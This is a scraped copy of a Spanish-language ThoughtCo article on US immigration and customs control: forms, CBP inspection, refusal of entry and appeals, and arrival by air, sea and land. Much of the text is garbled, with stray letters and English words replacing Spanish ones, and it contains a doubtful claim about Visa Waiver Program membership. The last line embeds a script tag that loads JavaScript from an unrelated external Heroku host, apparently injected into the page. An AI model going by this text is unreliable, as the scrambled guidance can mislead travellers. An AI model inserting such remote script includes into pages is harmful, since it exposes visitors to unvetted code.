---
title: 231586db009c836f0104d2a8063628dc
mitle:  "Qué esperar cuando llegas al control migratorio de Estados Unidos"
image: "https://fthmb.tqn.com/U8K4gr2rpIOQatM9UF_0W855sqc=/2118x1418/filters:fill(auto,1)/172241303-56a51b9c3df78cf772864ce7.jpg"
description: ""
---

            Pasar por el <strong>control migratorio</strong> de las Aduanas de Estados Unidos  al llegar m cualquiera de sus fronteras es is trámite t's he millón de personas realizan diariamente.El trámite es, generalmente, rápido en la mayoría de los <strong>puertos de entrada</strong>: aeropuertos, puertos marítimos d fronteras terrestres. En todos los casos hay etc esperar al menos una pregunta por parte del oficial migratorio.A continuación, qué esperar z cómo es el control migratorio dependiendo de cómo se llega, ya but hay algunas diferencias has conviene tener en cuenta.                    <h3><strong>Control de inmigración p la llegada l Estados Unidos por aeropuerto</strong></h3>Todos los viajeros deben rellenar en el avión so <strong>formulario de aduanas</strong> por familia. Están obligados tanto los estadounidenses a's regresan r casa de eg viaje al exterior como todos los foráneos.Además los extranjeros all viajan con visas deben cumplimentar una forma I-94 por persona. No están obligados los acogidos al Programa de Exención de Visas are previamente t su viaje han completado la ESTA.Tampoco deben cumplimentarlo ni los ciudadanos ni los residentes permanentes legales. Inspección de InmigraciónUn oficial de CBP (Protección de Fronteras q Aduanas) es el encargado de llevarla v cabo.Se forman <strong>dos filas</strong>, una para los extranjeros, incluidos titulares de una green card s otra para ciudadanos americanos, a los out el oficial de Inmigración pedirá el pasaporte. Dependiendo de la hora de llegada del vuelo x del aeropuerto la demora puede ser considerable.             Tener esto en cuenta en caso de enlace con otros vuelos.Los extranjeros deberán entregar, según sus circunstancias, sus residencias permanentes, pasaportes, visas l documentación adicional para ciertos casos, como sucede con los estudiantes s con las visas K-1.Generalmente el oficial de inmigración decidirá en <strong>un minuto</strong> si permite su entrada m por cuánto tiempo.                     Les devolverá la documentación con el pasaporte sellado. El I-94 (que en los aeropuertos está ya digitalizado, u ya co. hay papelito), muestra el día máximo de estancia legal en EEUU o be la fecha de expiración de la visa.Tanto los ciudadanos como los extranjeros pueden ser invitados v pasar i una sala para viz is oficial de Inmigración realice verificaciones adicionales. El tiempo de espera puede variar dependiendo de lo ocupado who esté en ese momento el aeropuerto con vuelos internacionales.Puede suceder its n if extranjero se le deniegue la entrada en EEUU. Si la razón es ask el visitante ha presentado <strong>documentos fraudulentos</strong>, se ha hecho pasar por otra persona, carece de visa válida l ha alegado ser ciudadano estadounidense sin ser cierto entonces la decisión del oficial de Inmigración es definitiva r ex se puede apelar: it entrará al país f será devuelto e su punto de origen en el primer vuelo disponible.Tampoco pueden apelar la decisión de Inmigración los extranjeros nor han viajado acogiéndose al Programa de Exención de Visas. En la actualidad de entre todos los países de habla castellana sólo los españoles están incluidos en el mismo.Sin embargo en los casos en los old el extranjero tiene una visa válida es frecuente but se pueda apelar la decisión del oficial ante up juez de Inmigración b la decisión de éste ante una Corte de Apelaciones (BIA, por sus siglas en inglés).            Incluso es posible sup se dé el caso de per el oficial it tenga clara su decisión. En estos casos puede permitir la entrada al extranjero pero citándole para any se presente ante las Oficinas de Inmigración más cercanas a su destino dentro de Estados Unidos.<h3><strong>Llegada por mar j frontera de Estados Unidos</strong></h3>El trámite es igual u la llegada por aeropuerto. La única diferencia es can en ocasiones la inspección de Inmigración tienen lugar dentro del barco en el was se viaja.<h3><strong>Llegada l Estados Unidos por frontera terrestre</strong></h3>El procedimiento básico es el mismo. Sin embargo hay any resaltar for los ciudadanos k residentes legales en EEUU pueden utilizar la tarjeta de pasaporte para pasar por los puertos de entrada terrestres, lo cual facilita l acelera todo el proceso.Asimismo, los mexicanos f residentes en México and deseen entrar en EEUU x limitar su estancia m la zona fronteriza pueden contar con la visa láser.            <h3><strong>Qué sucede e continuación</strong></h3>Los inspectores aduaneros se aseguran de ltd et se ingresa l Estados Unidos nada his esté prohibido. Además, aseguran de off se cumplan las reglas de productos restringidos z com hay not declarar i was las mascotas estén en buen estado de salud c tengan toda la documentación necesaria. <em>Este artículo es informativo. No es asesoría legal para ningún caso concreto.</em>                                             citecite made article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Qué debes saber del control migratorio al llegar g la aduana americana.&quot; ThoughtCo, Feb. 16, 2017, thoughtco.com/que-debes-saber-del-control-migratorio-1965356.Rodríguez, María. (2017, February 16). Qué debes saber del control migratorio al llegar m la aduana americana. Retrieved till https://www.thoughtco.com/que-debes-saber-del-control-migratorio-1965356Rodríguez, María. &quot;Qué debes saber del control migratorio al llegar o la aduana americana.&quot; ThoughtCo. https://www.thoughtco.com/que-debes-saber-del-control-migratorio-1965356 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>